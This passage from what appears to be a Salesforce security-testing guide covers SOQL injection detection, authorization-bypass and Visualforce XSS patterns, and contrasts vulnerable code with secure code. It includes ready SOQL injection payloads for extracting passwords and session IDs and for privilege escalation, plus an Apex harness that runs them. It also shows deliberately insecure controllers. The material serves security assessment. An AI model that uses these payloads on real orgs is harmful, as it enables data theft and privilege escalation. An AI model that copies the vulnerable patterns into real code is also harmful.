</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>                    // In properly encrypted fields, this should show masked values
</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>                    System.debug(&#39;Value: &#39; + c.SSN__c);
</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>                }
</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>            }
</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a>        } catch (Exception e) {
</span><span id="__span-28-14"><a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a>            System.debug(&#39;Encryption access error: &#39; + e.getMessage());
</span><span id="__span-28-15"><a id="__codelineno-28-15" name="__codelineno-28-15" href="#__codelineno-28-15"></a>        }
</span><span id="__span-28-16"><a id="__codelineno-28-16" name="__codelineno-28-16" href="#__codelineno-28-16"></a>    }
</span><span id="__span-28-17"><a id="__codelineno-28-17" name="__codelineno-28-17" href="#__codelineno-28-17"></a>}
</span></code></pre></div></p>
<p><strong>Impact</strong>: Identifies unprotected sensitive data vulnerable to exposure.</p>
<hr />
<h2 id="custom-code-security-analysis">Custom Code Security Analysis</h2>
<h3 id="1-soqlsosl-injection-vulnerabilities">1. SOQL/SOSL Injection Vulnerabilities</h3>
<p><strong>Objective</strong>: Identify injection vulnerabilities in dynamic queries.</p>
<p><strong>Vulnerable Pattern Detection</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1">-- Find Apex classes with potential SOQL injection</span>
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Body</span>
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ApexClass</span><span class="w"> </span>
</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Active&#39;</span><span class="w"> </span>
</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="n">Body</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Database.query(%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Body</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Database.getQueryLocator(%&#39;</span><span class="p">)</span>
</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">Body</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%+%&#39;</span>
</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>
</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="c1">-- Find classes using dynamic SOSL</span>
</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Body</span>
</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ApexClass</span>
</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Active&#39;</span>
</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">Body</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Search.query(%&#39;</span>
</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">Body</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%+%&#39;</span>
</span></code></pre></div></p>
<p><strong>Static Analysis Examples</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>// VULNERABLE: Direct string concatenation
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>public List&lt;Account&gt; searchAccounts(String searchTerm) {
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>    String query = &#39;SELECT Id, Name FROM Account WHERE Name LIKE \&#39;%&#39; + searchTerm + &#39;%\&#39;&#39;;
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>    return Database.query(query);
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>}
</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>
</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>// VULNERABLE: ORDER BY injection
</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>public List&lt;Account&gt; getAccountsSorted(String sortField) {
</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>    String query = &#39;SELECT Id, Name FROM Account ORDER BY &#39; + sortField;
</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>    return Database.query(query);
</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>}
</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>
</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>// SECURE: Using bind variables
</span><span id="__span-30-14"><a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a>public List&lt;Account&gt; searchAccountsSecure(String searchTerm) {
</span><span id="__span-30-15"><a id="__codelineno-30-15" name="__codelineno-30-15" href="#__codelineno-30-15"></a>    String searchKey = &#39;%&#39; + searchTerm + &#39;%&#39;;
</span><span id="__span-30-16"><a id="__codelineno-30-16" name="__codelineno-30-16" href="#__codelineno-30-16"></a>    return [SELECT Id, Name FROM Account WHERE Name LIKE :searchKey];
</span><span id="__span-30-17"><a id="__codelineno-30-17" name="__codelineno-30-17" href="#__codelineno-30-17"></a>}
</span></code></pre></div></p>
<p><strong>Injection Payloads</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="c1">-- Data extraction payload</span>
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="n">test</span><span class="o">%</span><span class="s1">&#39; UNION SELECT Id, Password__c FROM User WHERE Profile.Name = &#39;</span><span class="k">System</span><span class="w"> </span><span class="n">Administrator</span><span class="s1">&#39; AND Name LIKE &#39;</span><span class="o">%</span>
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="c1">-- Privilege escalation payload  </span>
</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="n">test</span><span class="o">%</span><span class="s1">&#39; UNION SELECT Id FROM PermissionSetAssignment WHERE PermissionSet.Name = &#39;</span><span class="n">Admin_Rights</span><span class="s1">&#39; AND AssigneeId = &#39;</span><span class="mi">005</span><span class="n">XX000001b0Qw</span><span class="s1">&#39; AND Id LIKE &#39;</span><span class="o">%</span>
</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>
</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="c1">-- Information disclosure payload</span>
</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="n">test</span><span class="o">%</span><span class="s1">&#39; UNION SELECT Id, SessionId__c FROM Custom_Session__c WHERE User__c = &#39;</span><span class="mi">005</span><span class="n">XX000001b0Qw</span><span class="s1">&#39; AND Id LIKE &#39;</span><span class="o">%</span>
</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>
</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="c1">-- ORDER BY subquery injection</span>
</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a><span class="n">Name</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">Contact</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">LastName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Smith&#39;</span><span class="p">)</span>
</span></code></pre></div></p>
<p><strong>Advanced SOQL Injection Testing</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>public class SOQLInjectionTester {
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>    public static void testDynamicQuery(String userInput) {
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>        try {
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>            // Test various injection payloads
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>            List&lt;String&gt; payloads = new List&lt;String&gt;{
</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>                &#39;\&#39; OR Name != \&#39;&#39;,
</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>                &#39;\&#39; UNION SELECT Id FROM User--&#39;,
</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>                &#39;\&#39;; UPDATE User SET IsActive = false; SELECT Id FROM Account WHERE Name = \&#39;&#39;,
</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a>                &#39;\&#39; AND (SELECT COUNT() FROM User) &gt; 0 AND Name = \&#39;&#39;
</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a>            };
</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a>
</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a>            for (String payload : payloads) {
</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a>                try {
</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a>                    String query = &#39;SELECT Id FROM Account WHERE Name = \&#39;&#39; + payload + &#39;\&#39;&#39;;
</span><span id="__span-32-15"><a id="__codelineno-32-15" name="__codelineno-32-15" href="#__codelineno-32-15"></a>                    List&lt;SObject&gt; results = Database.query(query);
</span><span id="__span-32-16"><a id="__codelineno-32-16" name="__codelineno-32-16" href="#__codelineno-32-16"></a>                    System.debug(&#39;Payload successful: &#39; + payload);
</span><span id="__span-32-17"><a id="__codelineno-32-17" name="__codelineno-32-17" href="#__codelineno-32-17"></a>                } catch (Exception e) {
</span><span id="__span-32-18"><a id="__codelineno-32-18" name="__codelineno-32-18" href="#__codelineno-32-18"></a>                    System.debug(&#39;Payload blocked: &#39; + payload + &#39; - &#39; + e.getMessage());
</span><span id="__span-32-19"><a id="__codelineno-32-19" name="__codelineno-32-19" href="#__codelineno-32-19"></a>                }
</span><span id="__span-32-20"><a id="__codelineno-32-20" name="__codelineno-32-20" href="#__codelineno-32-20"></a>            }
</span><span id="__span-32-21"><a id="__codelineno-32-21" name="__codelineno-32-21" href="#__codelineno-32-21"></a>        } catch (Exception e) {
</span><span id="__span-32-22"><a id="__codelineno-32-22" name="__codelineno-32-22" href="#__codelineno-32-22"></a>            System.debug(&#39;Testing error: &#39; + e.getMessage());
</span><span id="__span-32-23"><a id="__codelineno-32-23" name="__codelineno-32-23" href="#__codelineno-32-23"></a>        }
</span><span id="__span-32-24"><a id="__codelineno-32-24" name="__codelineno-32-24" href="#__codelineno-32-24"></a>    }
</span><span id="__span-32-25"><a id="__codelineno-32-25" name="__codelineno-32-25" href="#__codelineno-32-25"></a>}
</span></code></pre></div></p>
<p><strong>Impact</strong>: Data exfiltration, authentication bypass, privilege escalation.</p>
<h3 id="2-authorization-bypass-in-apex">2. Authorization Bypass in Apex</h3>
<p><strong>Objective</strong>: Identify missing sharing enforcement and CRUD/FLS checks.</p>
<p><strong>Sharing Bypass Detection</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>// VULNERABLE: Missing sharing enforcement
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>public without sharing class DataController {
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>    public List&lt;Account&gt; getAllAccounts() {
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>        return [SELECT Id, Name, Revenue__c FROM Account]; // Bypasses sharing rules
</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>    }
</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>}
</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>
</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>// VULNERABLE: No sharing keyword (defaults to without sharing in many contexts)
</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>public class UnsafeController {
</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>    @AuraEnabled
</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>    public static List&lt;Contact&gt; getContacts() {
</span><span id="__span-33-12"><a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a>        return [SELECT Id, Name, Email, SSN__c FROM Contact]; // System context
</span><span id="__span-33-13"><a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a>    }
</span><span id="__span-33-14"><a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a>}
</span><span id="__span-33-15"><a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a>
</span><span id="__span-33-16"><a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a>// SECURE: Proper sharing enforcement
</span><span id="__span-33-17"><a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a>public with sharing class SecureController {
</span><span id="__span-33-18"><a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a>    public List&lt;Account&gt; getAccessibleAccounts() {
</span><span id="__span-33-19"><a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a>        return [SELECT Id, Name FROM Account WITH SECURITY_ENFORCED];
</span><span id="__span-33-20"><a id="__codelineno-33-20" name="__codelineno-33-20" href="#__codelineno-33-20"></a>    }
</span><span id="__span-33-21"><a id="__codelineno-33-21" name="__codelineno-33-21" href="#__codelineno-33-21"></a>}
</span></code></pre></div></p>
<p><strong>CRUD/FLS Bypass Examples</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>// VULNERABLE: Missing object-level permissions check
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>public class UnsafeController {
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>    public void createAccount(String name) {
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>        Account acc = new Account(Name = name);
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>        insert acc; // No createable() check
</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>    }
</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>}
</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>
</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>// VULNERABLE: Missing field-level security check
</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>public class FieldBypassController {
</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a>    public void updateSensitiveField(Id accountId, String ssnValue) {
</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a>        Account acc = new Account(Id = accountId, SSN__c = ssnValue);
</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a>        update acc; // No field updateable() check
</span><span id="__span-34-14"><a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a>    }
</span><span id="__span-34-15"><a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a>}
</span><span id="__span-34-16"><a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a>
</span><span id="__span-34-17"><a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a>// SECURE: Proper security checks
</span><span id="__span-34-18"><a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a>public class SecureController {
</span><span id="__span-34-19"><a id="__codelineno-34-19" name="__codelineno-34-19" href="#__codelineno-34-19"></a>    public void createAccountSecure(String name) {
</span><span id="__span-34-20"><a id="__codelineno-34-20" name="__codelineno-34-20" href="#__codelineno-34-20"></a>        if (!Schema.sObjectType.Account.isCreateable()) {
</span><span id="__span-34-21"><a id="__codelineno-34-21" name="__codelineno-34-21" href="#__codelineno-34-21"></a>            throw new AuraHandledException(&#39;Access Denied&#39;);
</span><span id="__span-34-22"><a id="__codelineno-34-22" name="__codelineno-34-22" href="#__codelineno-34-22"></a>        }
</span><span id="__span-34-23"><a id="__codelineno-34-23" name="__codelineno-34-23" href="#__codelineno-34-23"></a>
</span><span id="__span-34-24"><a id="__codelineno-34-24" name="__codelineno-34-24" href="#__codelineno-34-24"></a>        Account acc = new Account(Name = name);
</span><span id="__span-34-25"><a id="__codelineno-34-25" name="__codelineno-34-25" href="#__codelineno-34-25"></a>        insert acc;
</span><span id="__span-34-26"><a id="__codelineno-34-26" name="__codelineno-34-26" href="#__codelineno-34-26"></a>    }
</span><span id="__span-34-27"><a id="__codelineno-34-27" name="__codelineno-34-27" href="#__codelineno-34-27"></a>}
</span></code></pre></div></p>
<p><strong>Automated Vulnerability Scanning</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>public class ApexSecurityScanner {
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>    public static void scanForSecurityIssues() {
</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>        List&lt;ApexClass&gt; classes = [SELECT Id, Name, Body FROM ApexClass WHERE Status = &#39;Active&#39;];
</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>
</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>        for (ApexClass cls : classes) {
</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>            String body = cls.Body.toLowerCase();
</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a>
</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>            // Check for SOQL injection patterns
</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>            if (body.contains(&#39;database.query(&#39;) &amp;&amp; body.contains(&#39; + &#39;)) {
</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a>                System.debug(&#39;Potential SOQL injection in: &#39; + cls.Name);
</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a>            }
</span><span id="__span-35-12"><a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a>
</span><span id="__span-35-13"><a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a>            // Check for missing sharing enforcement
</span><span id="__span-35-14"><a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a>            if (!body.contains(&#39;with sharing&#39;) &amp;&amp; !body.contains(&#39;inherited sharing&#39;)) {
</span><span id="__span-35-15"><a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a>                System.debug(&#39;No sharing enforcement in: &#39; + cls.Name);
</span><span id="__span-35-16"><a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a>            }
</span><span id="__span-35-17"><a id="__codelineno-35-17" name="__codelineno-35-17" href="#__codelineno-35-17"></a>
</span><span id="__span-35-18"><a id="__codelineno-35-18" name="__codelineno-35-18" href="#__codelineno-35-18"></a>            // Check for direct DML without security checks
</span><span id="__span-35-19"><a id="__codelineno-35-19" name="__codelineno-35-19" href="#__codelineno-35-19"></a>            if ((body.contains(&#39;insert &#39;) || body.contains(&#39;update &#39;) || body.contains(&#39;delete &#39;)) 
</span><span id="__span-35-20"><a id="__codelineno-35-20" name="__codelineno-35-20" href="#__codelineno-35-20"></a>                &amp;&amp; !body.contains(&#39;iscreatable&#39;) &amp;&amp; !body.contains(&#39;isupdateable&#39;) 
</span><span id="__span-35-21"><a id="__codelineno-35-21" name="__codelineno-35-21" href="#__codelineno-35-21"></a>                &amp;&amp; !body.contains(&#39;isdeletable&#39;)) {
</span><span id="__span-35-22"><a id="__codelineno-35-22" name="__codelineno-35-22" href="#__codelineno-35-22"></a>                System.debug(&#39;Missing CRUD checks in: &#39; + cls.Name);
</span><span id="__span-35-23"><a id="__codelineno-35-23" name="__codelineno-35-23" href="#__codelineno-35-23"></a>            }
</span><span id="__span-35-24"><a id="__codelineno-35-24" name="__codelineno-35-24" href="#__codelineno-35-24"></a>        }
</span><span id="__span-35-25"><a id="__codelineno-35-25" name="__codelineno-35-25" href="#__codelineno-35-25"></a>    }
</span><span id="__span-35-26"><a id="__codelineno-35-26" name="__codelineno-35-26" href="#__codelineno-35-26"></a>}
</span></code></pre></div></p>
<p><strong>Impact</strong>: Complete bypass of Salesforce security model, privilege escalation.</p>
<h3 id="3-visualforce-security-vulnerabilities">3. Visualforce Security Vulnerabilities</h3>
<p><strong>Objective</strong>: Identify XSS, CSRF, and information disclosure in Visualforce pages.</p>
<p><strong>XSS Vulnerability Patterns</strong>:
<div class="language-html highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="cm">&lt;!-- VULNERABLE: Unescaped output --&gt;</span>
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="p">&lt;</span><span class="nt">apex:page</span> <span class="na">controller</span><span class="o">=</span><span class="s">&quot;MyController&quot;</span><span class="p">&gt;</span>
</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>    <span class="p">&lt;</span><span class="nt">apex:outputText</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;{!userInput}&quot;</span> <span class="na">escape</span><span class="o">=</span><span class="s">&quot;false&quot;</span><span class="p">/&gt;</span>
</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>
</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>    <span class="cm">&lt;!-- VULNERABLE: Direct parameter access --&gt;</span>
</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">userdata</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;{!$CurrentPage.parameters.data}&#39;</span><span class="p">;</span>
</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>
</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>    <span class="cm">&lt;!-- VULNERABLE: Unvalidated rich text --&gt;</span>
</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>    <span class="p">&lt;</span><span class="nt">apex:inputField</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;{!record.Description__c}&quot;</span> <span class="na">richText</span><span class="o">=</span><span class="s">&quot;true&quot;</span><span class="p">/&gt;</span>
</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a><span class="p">&lt;/</span><span class="nt">apex:page</span><span class="p">&gt;</span>
</span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a>
</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a><span class="cm">&lt;!-- SECURE: Proper escaping --&gt;</span>
</span><span id="__span-36-15"><a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a><span class="p">&lt;</span><span class="nt">apex:page</span> <span class="na">controller</span><span class="o">=</span><span class="s">&quot;MyController&quot;</span><span class="p">&gt;</span>
</span><span id="__span-36-16"><a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a>    <span class="p">&lt;</span><span class="nt">apex:outputText</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;{!HTMLENCODE(userInput)}&quot;</span><span class="p">/&gt;</span>
</span><span id="__span-36-17"><a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-36-18"><a id="__codelineno-36-18" name="__codelineno-36-18" href="#__codelineno-36-18"></a><span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">userdata</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;{!JSENCODE($CurrentPage.parameters.data)}&#39;</span><span class="p">;</span>
</span><span id="__span-36-19"><a id="__codelineno-36-19" name="__codelineno-36-19" href="#__codelineno-36-19"></a><span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-36-20"><a id="__codelineno-36-20" name="__codelineno-36-20" href="#__codelineno-36-20"></a><span class="p">&lt;/</span><span class="nt">apex:page</span><span class="p">&gt;</span>
